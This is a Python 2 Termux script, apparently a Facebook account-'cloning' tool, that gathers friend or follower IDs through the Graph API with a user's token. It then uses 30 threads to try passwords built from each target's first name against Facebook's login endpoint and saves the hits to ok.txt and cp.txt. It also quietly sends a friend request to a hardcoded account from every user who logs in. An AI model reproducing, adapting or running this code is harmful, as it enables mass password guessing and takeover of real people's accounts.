#coding=utf-8
#!/usr/bin/python2
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 simple.py")
os.system("clear")
"""
try:
    my = requests.get("https://www.facebook.com/your.next.father.3747")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;97mTurn on mobile data OR wifi\033[1;97m")
    print("")
    
    raw_input(" Press enter to try again ")
    os.system("python2 simple.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
    os.system("apt install ruby -y && gem install lolcat")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/simple/jjjjj/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd jjjjj && npm install")
    os.system("cd jjjjj && node index.js &")
    os.system("clear")
    print("\033[1;32mWait checking....\033[1;97m")
    
elif os.path.isfile("/data/data/com.termux/files/home/simple/jjjjj/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd jjjjj && node index.js &")
    os.system("clear")
    print("\033[1;32mPlease Select Facebook To Continue\033[1;97m")
    os.system("xdg-open https://www.facebook.com/your.next.father.3747")
    time.sleep(10)
agents = [
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
c = "\033[1;32m"
c2 = "\033[1;97m"
c3 = "\033[1;97m"
logo ="""
\033[1;37m░█▀▀█ ─█▀▀█ ░█▀▀▀█ ░█─░█ ░█▀▀▀ ░█▀▀▄ 
\033[1;37m░█▄▄▀ ░█▄▄█ ─▀▀▀▄▄ ░█▀▀█ ░█▀▀▀ ░█─░█ 
\033[1;34m░█─░█ ░█─░█ ░█▄▄▄█ ░█─░█ ░█▄▄▄ ░█▄▄▀
\033[1;34m░█─░█ ░█▀▀▀█ ░█▀▀▀█ ░█▀▀▀█ ─█▀▀█ ▀█▀ ░█▄─░█ 
\033[1;37m░█▀▀█ ░█──░█ ─▀▀▀▄▄ ─▀▀▀▄▄ ░█▄▄█ ░█─ ░█░█░█ 
\033[1;37m░█─░█ ░█▄▄▄█ ░█▄▄▄█ ░█▄▄▄█ ░█─░█ ▄█▄ ░█──▀█
\033[1;37m-----------------------------------------------  
\033[1;37m HACKING IS NOT CRIME OKAY
\033[1;37m I FUCK YOUR SESTEM BROTHER OKAY
\033[1;36m FROM: SHARIATPUR DHAKA BANGLADESH
\033[1;36m Author NAME : JUWEL HOSSAIN
\033[1;36m FACEBOOK I'D NAME: ARIYAN AHMED
\033[1;36m FACEBOOK ID USER LINK: YOUR.NEXT.FATHER.3747
\033[1;36m WARNING : USE FAST AND 4G INTERNER
\033[1;36m WARNING: USE4GB & 6GB RAM PHONE
\033[1;36m WARNING: USE TOUCH VPN PROXY
\033[1;36m WARNING: CONNECT SINGAPORE FOR CLONING
\033[1;36m WARNING : STAY HOME STAY SAVE WITH LOVE
\033[1;37m-----------------------------------------------
"""
CorrectUsername = "ARIYAN"
CorrectPassword = "AHMED"

def login():
    os.system("clear")
    print(logo)
    print("")
    print("[1] Token login")
    print("[2] ID/Pass login")
    print("")
    login_select()
def login_select():
    wahid = raw_input(" \033[1;97mSelect : \033[1;97m ")
    if wahid =="1":
        os.system("clear")
        print(logo)
        print("")
        token = raw_input(" Past token here : ")
        print("")
        print("  \033[1;95mchecking token....\033[1;97m")
        time.sleep(5)
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            os.system('clear')
            print(logo)
            print("")
            print("\t\033[1;32m  Your Token Succeeded as : "+nm+"\033[1;97m")
            print 47*("\033[1;37m-")
            time.sleep(3)
            b_menu()
        except (KeyError , IOError):
            print("")
            print("\t    \033[1;91mToken not valid\033[1;97m")
            print("")
            raw_input(" Press enter to try again ")
            login()
    elif wahid =="2":
        login_fb()
    else:
        print("")
        print("\t    "+c+"\033[1;91mSelect valid option\033[1;97m"+c2)
        time.sleep(1)
        print("")
        login()
def login_fb():
	os.system("clear")
	print(logo)
	print("")
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		wahid_main = open(".fb_token.txt","w")
		wahid_main.write(q["loc"])
		wahid_main.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
		print("\t    \033[1;32mLogged in successfully\033[1;97m")
		b_menu()
	elif "www.facebook.com" in q["error"]:
		print("\t    \033[1;97mUser must verify account before login\033[1;97m")
		print("")
		raw_input(" Press enter to try again ")
		login()
	else:
		print("\t\033[1;97mID/Number/Password may be wrong\033[1;97m")
		print("")
		raw_input(" Press enter to try again ")
		login()
      
def b_menu():
    global token
    os.system("clear")
    print(logo)
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("")
        print("\t    "+c+"ID has checkpoint"+c2)
        print("")
        os.system("rm -rf .fb_token.txt")
        login()
    except requests.exceptions.ConnectionError:
        print(logo)
        print("")
        print("\t    \033[1;97mTurn on mobile data OR wifi \033[1;97m")
        print("")
        raw_input(" Press enter to try again \033[1;97m")
        b_menu()
    os.system("clear")
    print(logo)
    print("")
    print("[1] Public Cloning")    
    print("[2] Followers Cloning")
    print("[3] File Cloning")
    print("[0] Exit")
    print("")
    b_menu_select()
def b_menu_select():
	select = raw_input("\033[1;97mSelect :  ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print"\t    Public ID Cloning "
		print("")
		idt = raw_input(" Put Id/user :  ")
		os.system("clear")
		print(logo)
		print("")
		print"\t  \033[1;92m  Collecting..... \033[1;97m" 
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			print(logo)
			print("")
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;97m Logged in id has checkpoint\033[1;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print"\t    Followers Cloning " 
		print("")
		idt = raw_input(" Put Id/user : ")
		os.system("clear")
		print(logo)
		print("")
		print"\t   \033[1;92m Collecting......... \033[1;97m"
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			print(logo)
			print("")
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;91m Logged in id has checkpoint\033[1;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
	    os.system('clear')
	    try:
	        print(logo)
	        idlist= raw_input('[+] File Name:\033[1;97m ')
	        os.system('clear')
	        print(logo)
	        print("")
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] File Not Found."
	         raw_input('Press Enter To Back. ')
	         b_menu()
	else:
	    print("")
	    print("\t    "+c+"\033[1;31mSelect valid option\033[1;97m"+c2)
	    print("")
	    b_menu_select()
	print(" Total IDs : "+str(len(id)))
	time.sleep(0.5)
	print(" The process is running....")
	print("")
	print 47*("\033[1;37m-")
	print('')
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;32m[RASHED-HOSSAIN-Ok] \033[1;32m"+uid+" | "+pass1)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;32m[RASHED-HOSSAIN-CP] \033[1;32m"+uid+" | "+pass1+"\x1b[1;37m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;32m[RASHED-HOSSAIN-OK] \033[1;32m"+uid+" | "+pass2)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;32m[RASHED-HOSSAIN-CP] \033[1;32m"+uid+" | "+pass2+"\x1b[1;37m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;31m[RASHED-HOSSAIN-OK] "+uid+" | "+pass3)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print(" \x1b[1;32m[RASHED-HOSSAIN-CP] \033[1;32m"+uid+" | "+pass3+"\x1b[1;37m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;31m[ARIYAN-OK] "+uid+" | "+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;32m[ARIYAN-CP] \033[1;32m"+uid+" | "+pass4+"\x1b[1;37m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                
														
							
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (" ")
	print (47*"-")
	print ("")
	print ("Process has completed")
	print (" Total \033[1;97mCp/\033[1;32mOk :\033[1;97m "+str(len(cps)) + "\033[1;32m/"+str(len(oks)))
	print ("")
	print (47*"-")
	print ("")
	raw_input(" Press enter to back ")
	b_menu()
if __name__=='__main__':
    login()
